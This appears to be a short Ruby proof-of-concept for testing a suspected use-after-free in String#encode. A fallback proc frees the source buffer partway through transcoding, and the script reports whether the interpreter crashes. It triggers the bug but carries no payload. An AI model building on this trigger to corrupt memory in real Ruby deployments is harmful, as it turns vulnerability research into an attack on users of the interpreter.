# Hypothesis: String#encode caches source pointer sp=RSTRING_PTR(str) + in_stop=sp+slen
# (transcode.c str_transcode0), then transcode_loop invokes a user `fallback:` proc on the
# first undefined char. The proc reallocates the SOURCE string (the live receiver), freeing
# the cached buffer. `goto resume` -> rb_econv_convert reads from the dangling in_pos -> UAF.

src = "あ" * 8000          # 8000 Hiragana 'A' = 24000 bytes UTF-8, heap-allocated
src.force_encoding("UTF-8")

fired = false
prc = proc { |bad|
  unless fired
    fired = true
    # Reallocate/free the source buffer mid-transcode.
    src.replace("Z" * (32 * 1024 * 1024))   # 32MB: forces a fresh malloc, frees old 24KB buffer
  end
  "?"
}

# UTF-8 -> US-ASCII: every Hiragana char is an undefined conversion -> fallback fires.
result = src.encode("US-ASCII", fallback: prc)
STDERR.puts "NO CRASH len=#{result.bytesize}"
